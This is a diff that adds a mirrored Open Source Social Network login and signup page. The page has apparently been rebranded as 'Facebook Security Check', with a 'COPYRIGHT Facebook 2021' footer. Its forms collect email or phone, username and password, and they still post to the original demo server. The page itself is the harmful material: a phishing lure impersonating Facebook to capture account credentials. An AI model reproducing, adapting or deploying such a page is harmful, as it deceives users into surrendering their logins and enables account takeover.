@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en" id="ossn-html" class="">
+
+<!-- Mirrored from demo5.softlab24.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Apr 2021 03:38:03 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <title>Secure your Account - Facebook Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="icon" href="themes/white/images/favicon5b88.ico?ossn_cache=e4de04e1" type="image/x-icon" />
+	
+    <!-- 
+	Open Source Social Network (Ossn) https://www.opensource-socialnetwork.org/     
+	BY Informatikon Technologies (http://informatikon.com/)
+	BY SOFTLAB24 (https://www.softlab24.com/)
+	-->    
+<link rel="stylesheet" type="text/css" href="cache/css/1606407214/view/bootstrap.min.css" />
+<link rel="stylesheet" type="text/css" href="cache/css/1606407214/view/ossn.default.css" />
+<link rel="stylesheet" type="text/css" href="cache/css/1606407214/view/customfields.reset.css" />
+<script src="cache/js/1606407214/view/ossn.en.language.js"></script>
+<script src="vendors/jquery/jquery-1.11.1.min.js"></script>
+<script src="../ajax.googleapis.com/ajax/libs/jqueryui/1.10.4/jquery-ui.min.js"></script>
+<script src="../apis.google.com/js/platform.js"></script>
+<script src="components/OssnAutoPagination/vendors/jquery.scrolling5b88.js?ossn_cache=e4de04e1"></script>
+<script src="components/PasswordValidation/vendors/underscore-min.js"></script>
+<script src="cache/js/1606407214/view/opensource.socialnetwork.js"></script>
+<link rel="stylesheet" type="text/css" href="../maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=PT+Sans:400italic,700,400" />
+<script src="themes/white/vendors/bootstrap/js/bootstrap.min.js"></script>
+<link rel="stylesheet" type="text/css" href="../cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.4/css/jquery-ui.css" /><script>
+</script>
+<script>
+</script>
+    <script>
+         	
+	Ossn.site_url = 'index.html';
+	Ossn.Config = {"token":{"ossn_ts":1618803484,"ossn_token":"e2c4e43fcae9ef3048019bb2b99961ce"},"cache":{"last_cache":"e4de04e1","ossn_cache":"1"}};
+	Ossn.Init();
+    </script>
+</head>
+
+<body>
+	<div class="ossn-page-loading-annimation">
+    		<div class="ossn-page-loading-annimation-inner">
+            	<div class="ossn-loading"></div>
+            </div>
+    </div>
+
+	<div class="ossn-halt ossn-light"></div>
+	<div class="ossn-message-box"></div>
+	<div class="ossn-viewer" style="display:none"></div>
+    
+    <div class="opensource-socalnetwork">
+    	    	 <div class="ossn-page-container">
+			  <div class="topbar site-name-sm">
+	<div class="container-fluid">
+    	<div class="row site-name-container">
+        	<div class="col-md-8 site-name text-center">
+                <span onclick="Ossn.redirect('');"><img class="site-logo" src="themes/white/images/logo.png" /></span>
+            </div>
+            <div class="col-md-4 hidden-xs">
+                    <a href="login.html" class="btn btn-primary login-topbar">Login</a>
+                    <a href="login.html" class="btn btn-success register-topbar">Register</a>
+            </div>
+        </div>
+    </div>
+</div>
+          <div class="ossn-inner-page">    
+  	  		  <div class="ossn-layout-startup">
+	<div class="container">
+		<div class="row">
+            <div class="ossn-system-messages">
+	   <div class="row">
+	  	 <div class="col-md-11">
+       			<div class="ossn-system-messages-inner">
+    				            		</div>
+	   	</div>
+	</div>
+</div>    
+        
+			<div class="ossn-home-container">
+				<div class="inner">
+					<script>
+	$(document).ready(function(){
+		$('footer').find('.col-md-11').addClass('col-md-12').removeClass('col-md-11');			
+		$('body').on('click', '.login-topbar, .register-topbar', function(e){
+					e.preventDefault();
+					$('.home-right-image').toggle();
+					$('.home-right-login').toggle();
+					$('.register-topbar').toggle();
+					$('.login-topbar').toggle();
+		});		
+		$('body').on('click', '.login-topbar-xs, .register-topbar-xs', function(){
+					$('.home-right-image').toggle();
+					$('.home-left-contents').toggle();
+					$('.home-right-login').toggle();	
+					$('.register-topbar-xs').toggle();
+					$('.login-topbar-xs').toggle();
+		});
+	});
+</script>
+<style>
+.ossn-home-container,
+.ossn-inner-page {
+	margin-top:40px;
+}
+.home-left-contents {
+    margin-top: 20px;
+}
+</style>
+<div class="row">
+	<div class="col-md-12">
+<div class="welcome-text">
+	<div class="welcome">Welcome to Facebook Security Check</div>
+    <p>Join now to make new friends, create groups, add photos, and much more.</p>
+    <p class="visible-xs"><a href="javascript:void(0);" class="btn btn-primary login-topbar-xs btn-lg">Login</a><a href="javascript:void(0);" class="btn btn-primary register-topbar-xs btn-lg">Register</a></p>
+</div>    
+    </div>
+</div>	
+<div class="row ossn-page-contents">
+		<div class="col-md-7 home-left-contents">
+	                        <img src="themes/white/images/screen.png" class="img-responsive" />            
+ 	    </div>      
+        <div class="col-md-5">
+			<div class="home-right-contents">
+            			<div class="home-right-image">
+       					<div class="ossn-widget">
+	<div class="widget-heading">Create an account</div>
+	<div class="widget-contents">
+		<form id="ossn-home-signup" action="https://demo5.softlab24.com/action/user/register" class="ossn-form" method="post"  enctype='multipart/form-data'><fieldset> <input type="hidden" name="ossn_ts" value="1618803484" />
+ <input type="hidden" name="ossn_token" value="e2c4e43fcae9ef3048019bb2b99961ce" /> <div class="form-inline">
+	<div class="form-group ossn-form-group-half">
+	    <input type="text" class="form-control" name="firstname" placeholder="First Name"/>
+    </div>
+    <div class="form-group ossn-form-group-half"> 	   
+	    <input type="text" class="form-control" name="lastname" placeholder="Last Name"/>
+    </div>
+</div>
+<div class="form-inline">
+	<div class="form-group ossn-form-group-half">
+    	<input type="text" class="form-control" name="email" placeholder="Email"/>
+    </div>
+    <div class="form-group ossn-form-group-half"> 	   
+    	<input name="email_re" class="form-control" type="text" placeholder="Re-enter Email"/>
+    </div>
+</div>
+<div>
+    <input type="text" class="form-control" name="username" placeholder="Username"/>
+</div>
+
+<div>
+    <input type="password"  class="form-control" name="password" placeholder="Password" />
+</div>
+<div class='custom-field-items'><div class="row customfield-item" data-guid="1"><div class="col-md-12"><div class='text'><input class="form-control " type="text" name="birthdate" placeholder="Birthdate" /></div></div></div><div class="row customfield-item" data-guid="2"><div class="col-md-12"><div class='radio-block-container'><div class='radio-block'><input class="ossn-radio-input" type="radio" name="gender" placeholder="gender" value="male" /><span>Male</span></div><div class='radio-block'><input class="ossn-radio-input" type="radio" name="gender" placeholder="gender" value="female" /><span>Female</span></div></div></div></div></div><div>
+</div>
+
+<div id="ossn-signup-errors" class="alert alert-danger"></div>
+
+<p>
+    By clicking Create an account, you agree to our        <a target="_blank" href="site/terms.html">Terms and Conditions</a>
+</p>
+<div class="ossn-loading ossn-hidden"></div>
+<input type="submit" id="ossn-submit-button" class="btn btn-success" value="Create an account" class=""/>
+<script>
+$(document).ready(function() {
+    $custom_fields = "";
+    if ($custom_fields) {
+        //remove custom fields non-custom fields created fields
+        $i = 0;
+        $('.customfield-item').each(function() {
+            if ($(this).attr('data-guid') == '') {
+                $(this).attr('data-guid', $i);
+                $(this).attr('data-order', $i);
+                $i--;
+            }
+        });
+        $allfields_raw = $custom_fields.split(',');
+        $.each($allfields_raw, function(key, val) {
+            $order = key + 1;
+            $field = $('div[data-guid="' + val.replace('customfield-item-', '') + '"]').attr('data-order', $order);
+        });
+        $list = $('.customfield-item').sort(function(a, b) {
+            var contentA = parseInt($(a).attr('data-order'));
+            var contentB = parseInt($(b).attr('data-order'));
+            return (contentA < contentB) ? -1 : (contentA > contentB) ? 1 : 0;
+        });
+        $('.custom-field-items').html($list);
+        $("input[name='birthdate']").removeClass('hasDatepicker');
+        var cYear = (new Date).getFullYear();
+        var alldays = Ossn.Print('datepicker:days');
+        var shortdays = alldays.split(",");
+        var allmonths = Ossn.Print('datepicker:months');
+        var shortmonths = allmonths.split(",");
+
+        var datepick_args = {
+            changeMonth: true,
+            changeYear: true,
+            dateFormat: 'dd/mm/yy',
+            yearRange: '1900:' + cYear,
+        };
+
+        if (Ossn.isLangString('datepicker:days')) {
+            datepick_args['dayNamesMin'] = shortdays;
+        }
+        if (Ossn.isLangString('datepicker:months')) {
+            datepick_args['monthNamesShort'] = shortmonths;
+        }
+        $("input[name='birthdate']").datepicker(datepick_args);
+    }
+});
+</script></fieldset></form>	</div>
+</div>
+	                      	
+                        </div>
+                        <div class="home-right-login">
+                        	<div class="ossn-widget">
+	<div class="widget-heading">Login</div>
+	<div class="widget-contents">
+		<form id="ossn-login" action="https://demo5.softlab24.com/action/user/login" class="ossn-form" method="post"  enctype='multipart/form-data'><fieldset> <input type="hidden" name="ossn_ts" value="1618803484" />
+ <input type="hidden" name="ossn_token" value="e2c4e43fcae9ef3048019bb2b99961ce" /> <div>
+     <label>Email</label>
+     <input type="text" name="username" placeholder="Email or Phone number" />
+</div>
+
+<div>
+     <label>Password</label>
+     <input type="password" name="password" autocomplete="off"  placeholder="Password"  />
+</div>
+<div>
+	
+<a href="index.html?ossn_ts=1618803484&amp;ossn_token=e2c4e43fcae9ef3048019bb2b99961ce" class="btn btn-block btn-social btn-twitter btn-sm">
+  <span class="fa fa-twitter"></span>
+  Login with Twitter</a>
+<input id="kmli" type="checkbox" name="rememberlogin"> Keep me logged in<br>
+<!-- <p>Your browser fingerprint: <strong id="fp"></strong></p> -->
+</div>
+<div>
+    <input type="submit" value="Login" class="btn btn-primary"/>
+    <a href="resetlogin.html">Reset Password </a>
+</div>
+</fieldset></form>	</div>
+</div>
+                        </div>
+            </div>
+        </div>
+</div>					</div>
+			</div>
+		</div>
+		<footer>
+    <div class="col-md-11">
+        <div class="footer-contents">
+            <div class="ossn-footer-menu">
+                <a class="menu-footer-a_copyrights" href="index.html">&copy; COPYRIGHT Facebook 2021</a><a class="menu-footer-about" href="site/about.html">About</a><a class="menu-footer-site" href="site/terms.html">Terms and Conditions</a><a class="menu-footer-privacy" href="index.html">Privacy</a>            </div>
+                 
+        </div>
+    </div>
+</footer>
+	</div>
+</div>
+<script>$(window).ready(function(){$('body').addClass('ossn-layout-startup-background');}); </script>
+          </div>    
+		</div>
+    </div>
+    <div id="theme-config" class="hidden" data-desktop-cover-height="200" data-minimum-cover-image-width="1040"></div>	
+               
+</body>
+
+<!-- Mirrored from demo5.softlab24.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Apr 2021 03:38:30 GMT -->
+</html>
